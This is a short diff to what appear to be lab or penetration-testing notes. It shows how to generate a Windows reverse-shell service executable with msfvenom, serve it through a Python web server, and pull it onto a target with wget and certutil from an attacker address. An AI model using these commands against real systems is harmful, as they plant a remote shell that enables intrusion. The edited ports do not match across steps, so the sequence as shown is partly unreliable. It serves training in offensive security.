@@ -2,22 +2,19 @@
 Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
 
 KaliLinux
+```shell
+# Creating a shell
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 
-```shell-session
-user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
-
-user@attackerpc$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+python3 -m http.server 9000
 ```
 
 Powershell / Linux
-
 ```shell-session
 wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 ```
 
 CMD
-
 ```bash
 certutil -urlcache -f http://10.17.21.72:9000/shell.exe Wservice.exe
 ```
